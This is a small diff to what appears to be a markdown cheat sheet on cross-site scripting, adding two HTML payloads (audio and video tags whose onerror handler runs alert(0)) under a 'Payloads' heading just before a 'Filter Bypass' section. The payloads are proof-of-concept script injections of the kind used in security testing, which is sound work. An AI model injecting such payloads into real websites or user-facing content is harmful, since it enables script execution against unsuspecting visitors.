@@ -6,6 +6,10 @@
 
 
 ### 3.Payloads
+```
+<audio src=x onerror=alert(0)>
+<video src=x onerror=alert(0)>
+```
 
 #### 3.1 Filter Bypass
 ```
